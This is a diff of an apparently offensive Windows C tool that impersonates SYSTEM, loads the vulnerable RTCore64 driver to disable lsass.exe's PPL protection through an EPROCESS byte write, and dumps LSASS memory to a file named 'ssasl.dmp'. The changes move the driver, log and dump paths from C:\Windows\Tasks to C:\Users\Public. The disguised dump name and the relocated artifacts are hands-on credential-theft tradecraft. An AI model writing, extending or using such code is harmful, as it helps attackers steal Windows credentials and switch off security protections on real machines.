@@ -2,7 +2,7 @@
 
     Author: vari.sh
 
-    Description: - This program impersonates SYSTEM and implements LSASS dump. Creates a log.txt file in C:\Windows\Tasks.
+    Description: - This program impersonates SYSTEM and implements LSASS dump. Creates a log.txt file in C:\Users\Public.
                  - Additionally, it uses primitives to access memory via the RTCore64 driver,
                    and reads the EPROCESS structure of lsass.exe to verify the offsets needed for disabling PPL.
                    It then writes the byte that disables PPL.
@@ -260,7 +260,7 @@ Offsets getOffsets() {
 
 // Function to load and start the driver
 #define DRIVER_NAME "mDriver"
-#define DRIVER_PATH "C:\\Windows\\Tasks\\RTCore64.sys"
+#define DRIVER_PATH "C:\\Users\\Public\\RTCore64.sys"
 #define DEVICE_NAME L"\\\\.\\RTCore64"
 
 // Helper function to open the Service Control Manager with the specified access rights
@@ -940,7 +940,7 @@ int disableCG() {
 int main(void)
 {
     // Logs
-    logfile = fopen("C:\\Windows\\Tasks\\log.txt", "a");
+    logfile = fopen("C:\\Users\\Public\\log.txt", "a");
 
     // Initialize STARTUPINFO and PROCESS_INFORMATION structures.
     STARTUPINFOW si;
@@ -1048,7 +1048,7 @@ int main(void)
     }
 
     // Define the dump file path
-    const char* dumpFilePath = "C:\\Windows\\tasks\\ssasl.dmp";
+    const char* dumpFilePath = "C:\\Users\\Public\\ssasl.dmp";
 
     // Create the dump file
     HANDLE hFile = CreateFileA(dumpFilePath,
